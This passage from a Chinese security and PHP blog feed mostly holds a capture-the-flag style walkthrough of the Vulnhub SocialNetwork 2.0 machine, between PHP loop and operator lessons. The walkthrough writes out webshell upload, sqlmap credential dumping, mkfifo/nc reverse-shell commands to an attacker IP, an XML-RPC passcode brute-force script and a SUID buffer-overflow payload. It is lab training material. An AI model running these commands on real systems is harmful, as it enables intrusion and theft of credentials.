class="line">&lt;/form&gt;</span><br><span class="line">FORM;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rows&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;rows&#x27;</span>]: <span class="number">0</span>;</span><br><span class="line"><span class="variable">$cols</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cols&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;cols&#x27;</span>]: <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="variable">$rows</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$j</span> &lt; <span class="variable">$cols</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>.(<span class="variable">$i</span> * <span class="variable">$cols</span> + <span class="variable">$j</span>).<span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$j</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117111453.png" /></p>
<h2 id="do-while-循环">3.3. <code>do-while</code> 循环</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117111553.png" /></p>
<p>语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	...;</span><br><span class="line">&#125;<span class="keyword">while</span>(condition);</span><br></pre></td></tr></table></figure>
<p>用表格自动生成器举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> &lt;&lt;&lt;<span class="string">&#x27;FORM&#x27;</span></span><br><span class="line">&lt;h2&gt;表格自动生成器&lt;/h2&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    请输入：</span><br><span class="line">    &lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;rows&quot;</span>&gt;行</span><br><span class="line">    &lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;cols&quot;</span>&gt;列</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">FORM;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rows&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;rows&#x27;</span>]: <span class="number">0</span>;</span><br><span class="line"><span class="variable">$cols</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cols&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;cols&#x27;</span>]: <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>.(<span class="variable">$i</span> * <span class="variable">$cols</span> + <span class="variable">$j</span>).<span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$j</span>++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="variable">$j</span> &lt; <span class="variable">$cols</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="variable">$rows</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>注意：一打开网页就会显示：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117111905.png" /></p>
<p>此时已经有表格，这是因为 <code>do-while</code>
循环一定会执行一次循环体内的代码，这就是与 <code>while</code>
的最大区别。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117111946.png" /></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>5. Vulvhub SocialNetwork2.0 Writeup</title>
    <url>/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度困难，涉及到逆向（不会！）。这个靶机的难点就是在缓冲区溢出漏洞。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a
href="https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/">social_network_2.0</a></p>
<p>难度：Hard</p>
<p>虚拟机软件：Virtual Box</p>
<p>目标：获得root权限</p>
<p><strong>涉及的攻击方法</strong>：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>SQL注入</li>
<li>文件上传</li>
<li>蚁剑上线</li>
<li>CVE利用</li>
<li><strong>XMLRPC命令执行</strong></li>
<li><strong>动态调试</strong></li>
<li><strong>漏洞利用代码编写</strong></li>
</ul>
<h1 id="渗透">渗透</h1>
<p>kali：10.0.2.4</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203809.png" /></p>
<p>靶机IP为：10.0.2.8</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.8</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203853.png" /></p>
<p>靶机开了2个端口：80，8000</p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.8</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204014.png" /></p>
<ol type="1">
<li>80和8000端口的服务都是http</li>
<li>靶机系统是Ubuntu</li>
<li>80端口上的CMS是Apache，版本为2.4.29</li>
<li>8000端口上的服务是BaseHTTPServer，版本为0.3</li>
<li>靶机上有python2的环境</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>首先访问8000端口，发现提示信息 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error code 501.</span><br><span class="line">Message: Unsupported method (&#x27;GET&#x27;).</span><br><span class="line">Error code explanation: 501 = Server does not support this operation. </span><br></pre></td></tr></table></figure></p>
<p>简而言之就是服务端不接受GET请求方式。因此，我们换请求方式，但是在尝试了所有请求方式后发现都不行。这个端口的思路到此就断了。</p>
<p>那访问80端口，发现是一个登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204512.png" /></p>
<p>首先尝试万能密码，但被提示<code>invalid email format</code>。因此，就需要换一个思路。<strong>注意到该网址有一个<code>Sign Up</code>功能，因此，接下来应该先注册一个账号，然后收集登陆进去的信息</strong>。这是非常重要的思路！</p>
<p>进去之后发现这是一个类似微博一样的功能，注意到除了我之外还有两个用户<code>admin admin</code>
和<code>testuser testuers</code>。还注意到有一个<strong>搜索框</strong>以及头像可以<strong>上传文件</strong>！</p>
<h2 id="蚁剑上线">蚁剑上线</h2>
<p>先测试上传文件功能点。上传一个一句话，然后鼠标右键头像，打开链接，发现成功打开，并且得到文件的路径。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205340.png" /></p>
<p>直接使用蚁剑连接。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205811.png" /></p>
<h2 id="sql注入">SQL注入</h2>
<p>测试刚刚那个搜索框，先输入一个单引号，发现报错了，因此，存在SQL注入，并且数据库为MySQL</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405210036.png" /></p>
<p>直接用sqlmap <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sqlmap -r r.txt -p query <span class="comment"># 其中r.txt保存的是搜索的请求数据包</span></span><br><span class="line">2. sqlmap -r r.txt -p query --dbs</span><br><span class="line">3. sqlmap -r r.txt -p query -D socialnetwork --tables</span><br><span class="line">4. sqlmap -r r.txt -p query -D socialnetwork -T users --columns</span><br><span class="line">5. sqlmap -r r.txt -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure></p>
<p>成功获得邮箱和密码的hash值，一般密码都是md5加密的，因此解密之后得到下表：</p>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">email</th>
<th style="text-align: center;">encryPasswd</th>
<th style="text-align: center;">passwd</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>admin@localhost.com</code></td>
<td style="text-align: center;">21232f297a57a5a743894a0e4a801fc3</td>
<td style="text-align: center;">admin</td>
</tr>
<tr class="even">
<td
style="text-align: center;"><code>21232f297a57a5a743894a0e4a801fc3</code></td>
<td style="text-align: center;">5d9c68c6c50ed3d02a2fcf54f63993b6</td>
<td style="text-align: center;">testuser</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>hdfzzf@123.com</code></td>
<td style="text-align: center;">249abd700757d98f77fa6ff4f0c2a750</td>
<td style="text-align: center;">hdfzzf</td>
</tr>
</tbody>
</table>
<p>此时就可以使用admin的邮箱和密码登录。</p>
<p>发现一条靶机系统上有一个<code>monitor.py</code>脚本。其他并没有什么特别的。</p>
<h2 id="反弹shell">反弹shell</h2>
<p>蚁剑获得的shell功能不够，因此需要用nc反弹或者python，然后进行shell升级。</p>
<p>kali先监听3333端口，然后蚁剑shell上执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 3333 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
<p>然后进行shell升级，和之前一样，这里不多赘述</p>
<h2 id="cve-2021-3493提权">CVE-2021-3493提权</h2>
<p>Ubuntu有一个CVE-2021-3493，可以直接进行本地提权。</p>
<p>漏洞利用下载地址：<a
href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a></p>
<p>下载完之后，编译之后发送到靶机。然后再执行该exp即可。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214049.png" /></p>
<p>成功提权。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214121.png" /></p>
<p>这样子似乎很快，但是这台靶机是2020年出的，而该漏洞是2021年爆出的，因此，回归当年的环境，用别的方法提权。</p>
<h2 id="信息收集">信息收集</h2>
<p>下面命令可以获得具体发行版本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406110128.png" /></p>
<p>发现与<code>/bin/bahs</code>有关的用户： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214351.png" /></p>
<p>发现两个用户。这里其他信息收集的过程就不多赘述了。</p>
<p>记得刚刚有一个脚本<code>monitor.py</code>，在<code>/home/socnet</code>目录下找到了它，查看源码：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure></p>
<p>这里有一个技术：<a
href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">XMLRPC</a></p>
<p>（这个脚本也解释了为什么在访问8000端口的时候不接受所有的请求方式！）</p>
<p>简单来说就是客户端可以通过该技术调用服务端提供的函数。而查看进程发现，该脚本处于运行状态。通过代码审计发现，靶机作为服务端启动服务，并且有多个函数，注意到最后一个<code>secure_cmd</code>，只要满足条件，就能够执行任意代码。我们并不知道<code>debugging_pass</code>值是多少，这是通过随机函数在脚本刚执行时随机的一个值，但是也就几千个，直接爆破即可。</p>
<h2
id="第一次权限提升xmlrpc命令执行">第一次权限提升——XMLRPC命令执行</h2>
<p>编写如下脚本爆破<code>debugging_pass</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">		r = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&quot;whoami&quot;</span>, i))</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">		    <span class="built_in">print</span>(r)</span><br><span class="line">		    <span class="built_in">print</span>(<span class="string">&quot;the value of debugging_pass is %d&quot;</span> % i)</span><br><span class="line">		    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405221433.png" /></p>
<p>得到<code>debugging_pass=5166</code>，并且发现执行的结果是<code>socnet</code>。如果利用该脚本反弹shell，那么获得的shell就是<code>socnet</code>的。</p>
<p>此时再次执行nc反弹 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f&quot;</span></span><br><span class="line">    p = <span class="number">5166</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the script is running:&quot;</span>)</span><br><span class="line">    proxy.secure_cmd(cmd, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405222307.png" /></p>
<p>成功提权到<code>socnet</code>。然后再次进行shell升级。</p>
<h2
id="第二次权限提升缓存区溢出漏洞">第二次权限提升——缓存区溢出漏洞</h2>
<p>首先，在<code>socnet</code>的家目录下有三个文件（目录），并且<code>add_record</code>具有SUID，所有者为root。因此，想办法通过该可执行文件获得root权限。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405223223.png" /></p>
<p>注意到<code>peda</code>，这是一款动态调试的工具。<a
href="https://www.jianshu.com/p/283b5466684b">peda信息</a></p>
<p>思路：动态调试<code>add_record</code>，找到缓冲区溢出漏洞，利用漏洞</p>
<h3 id="动态调试">动态调试</h3>
<p>首先执行该程序，发现需要依次填写多个信息：</p>
<ol type="1">
<li>Employee Name</li>
<li>Years worked</li>
<li>Salary</li>
<li>Ever got in trouble?</li>
<li>如果上个问题答案为1，则填写Explain；否则程序结束。</li>
</ol>
<p>输入下述命令开始动态调试： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -q ./add_record</span><br><span class="line"></span><br><span class="line">再次输入r才可以执行该程序。</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>如何找缓冲去漏洞呢？首先就是生成一长串的字符A，然后找到所有的数据提交点，每次测试一个提交点。比如上述有5个提交点，第一次将生成的字符串输入到Employee
Name，其他提交点正常传入数据，以此类推。
这样就可以通过查看其他寄存器是否充满字符A来判断是否存在缓冲区漏洞。</p>
</blockquote>
<p>这里做一组对比，第一组测试<code>Employee Name</code>：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224330.png" /></p>
<p>直接退出程序，说明该提交点并不存在缓冲区漏洞。</p>
<p>第二组测试<code>Explain</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224520.png" /></p>
<p>可以看到许多寄存器都是A，证明该提交点存在缓冲区溢出漏洞。<strong>注意寄存器<code>EIP</code>，该寄存器存放的是CPU执行的下一条指令的存放地址</strong>。</p>
<p>接着，需要判断EIP中的4个A是提交的字符串中的哪几个，可以先不断减少字符A的个数，然后提交，直到找到。也可以生成特征字符串（每4个为一个子串，在整个字符串中。子串是唯一的）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create [len] # 长度至少要保证EIP中充满A</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225135.png" /></p>
<p>然后利用命令自动查找位置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern search</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225310.png" /></p>
<p>EIP的第一个字符在特征字符串的位置是62（位置从0开始），因此，EIP在字符串中的位置就是62，63，64，65四个位置。可以验证一下，生成如下字符串：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225456.png" /></p>
<p>然后带入进去，如果此时EIP内是BCDE，则代表位置正确。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225548.png" /></p>
<p>位置正确</p>
<h3 id="查看汇编代码">查看汇编代码</h3>
<h4 id="该程序的汇编代码">该程序的汇编代码</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230105.png" /></p>
<p>尖括号里面是函数，带<code>@plt</code>的是自带的函数，不带的则是自己编写的函数。<code>call</code>代表调用。最前面的16进制数字表示该指令存放的内存地址。</p>
<p>可以通过打断点调试，测试函数的功能（以<code>0x080487ea</code>为例，断点要打在这句话的前一个位置）。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break *0x080487e7</span><br><span class="line">r</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230637.png" /></p>
<p>当输入1之后程序停止了，输入<code>s</code>单步运行，然后正好到我们要测试的函数<code>getchar@plt</code>，说明这里的作用就是获得我们的输入。</p>
<p>注意到这里有一个<code>vuln</code>的函数。可以利用<code>info func</code>查看该程序的所有函数，发现里面有<code>system@plt, setuid@plt, vuln, backdoor</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231236.png" /></p>
<h4 id="vuln函数的汇编代码">vuln函数的汇编代码</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231350.png" /></p>
<p>注意<code>strcpy@plt</code>，这个函数存在着漏洞。<a
href="https://stackoverflow.com/questions/48356481/exploiting-strcpy-in-c-with-buffer-overflow">strcpy缓冲区溢出漏洞</a></p>
<p>因此，之前测试的缓冲区溢出漏洞出现的原因就是主函数调用<code>vuln</code>，然后<code>vuln</code>又调用了该函数造成的。</p>
<h4 id="backdoor函数的汇编代码">backdoor函数的汇编代码</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231651.png" /></p>
<p>注意到这里先运行了<code>setuid</code>，然后运行了<code>system</code>，也就是此时的<code>system</code>可能是以root权限运行的。那么此时就需要知道<code>system</code>执行了什么命令。</p>
<p><strong>复制<code>backdoor</code>第一条指令的地址。然后利用缓冲区溢出的漏洞，将该地址放到EIP中，这样，随着程序的执行，就会将<code>backdoor</code>函数调用</strong>。</p>
<blockquote>
<p>可以生成一个文件，把每一个问题的回答都写入，回答之间用换行符分割，然后
r &lt; filename，自动化执行。</p>
</blockquote>
<p>第一步，生成一个文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import struct; print(&#x27;h\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> &gt; payload</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103054.png" /></p>
<p>（观察前面注入BCDE的时候，EIP内容是BCDE，但是16进制是0x45444342，可以看到顺序被颠倒了，因此，我们写入backdoor函数的第一条指令的地址的时候也需要颠倒以下写进去，所以使用<code>struct.pack</code>）</p>
<p>第二步，执行命令 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r &lt; payload</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103200.png" /></p>
<p>注意下几句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[New process 4825]</span><br><span class="line">process 4825 is executing new program: /bin/dash</span><br><span class="line">[New process 4826]</span><br><span class="line">process 4826 is executing new program: /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>当我们往<code>EIP</code>写入<code>backdoor</code>指令后，该程序就会自动调用<code>backdoor</code>函数，结果如上。如果没有调用该函数，那么就不会出现上述结果。因此，<code>backdoor</code>函数执行了<code>/bin/bash</code>和<code>/bin/dash</code>，并且在该程序执行完毕之后退出。</p>
<p>因此，我们只需要正常的执行程序，然后在Explain处将<code>backdoor</code>函数的第一条指令写入到<code>EIP</code>寄存器即可获得root权限。</p>
<p>第三步，动态调试验证 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break vuln </span><br></pre></td></tr></table></figure></p>
<p>单步执行到<code>backdoor</code>函数之后就需要慢点操作了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104348.png" /></p>
<p>单步执行到<code>setuid</code>函数。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104448.png" /></p>
<p>该函数执行完毕之后取得suid权限。然后注意单步执行到下图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105131.png" /></p>
<p>将<code>/bin/bash</code>写入到EAX寄存器，然后调用<code>system</code>函数去执行EAX中的指令，这样得到的结果就是root权限的shell。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105554.png" /></p>
<p>（管道符前面的减号的意思是将payload中的内容作为标准输入输出。）</p>
<p>成功获得root权限，这台靶机到此就全部结束了。</p>
<h1 id="总结">总结</h1>
<p>这台靶机难度很大，涉及到了<strong>缓冲区溢出漏洞</strong>，这是我第一次见识到这种漏洞，因此可能存在着错误。</p>
<p>Linux提权中优先考虑：内核漏洞、SUID、SUDO配置。但是这台靶机将SUID和缓冲区溢出漏洞结合在一起。这为提权带来了一种思路！</p>
<p>如果http服务存在着注册功能点，一定要尝试一下，看一些登陆进去的界面是否存在着漏洞！但是，千万别写真实的个人信息。</p>
<p>遇到新的技术——XMLRPC，需要快速的掌握其工作原理。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>缓冲区溢出漏洞</tag>
        <tag>XMLRPC命令执行</tag>
        <tag>动态调试</tag>
      </tags>
  </entry>
  <entry>
    <title>5. 运算符与表达式</title>
    <url>/2022/11/17/5.%20%E8%BF%90%E7%AE%97%E7%AC%A6%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="运算符">1. 运算符</h1>
<p>也叫作操作符，对一个或多个操作数进行某种运算的符号。</p>
<p>运算符的分类：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117112133.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117112156.png" /></p>
<blockquote>
<p>字符串运算符 <code>.</code> 起拼接字符串作用。</p>
</blockquote>
<p>其实还有一个位运算符（用的少）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117112306.png" /></p>
<blockquote>
<p>当不能整除的时候，会自动转为浮点数。</p>
</blockquote>
<p>这里主要说明一下比较运算符中的：</p>
<ol type="1">
<li><code>==</code> ：只判断值是否相等；</li>
<li><code>===</code> ：判断值和类型是否相等；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">&quot;100&quot;</span> == <span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="string">&quot;100&quot;</span> === <span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117113120.png" /></p>
<p>可以看到，前者的结果为相等，而后者的结果为不相等，这就是弱类型比较和强类型比较。</p>
<p>和：</p>
<ol type="1">
<li><code>!=</code> 和 <code>&lt;&gt;</code>
：两者作用一样，只判断值是否不相等；</li>
<li><code>!==</code> ：判断值或类型是否都不相等；</li>
</ol>
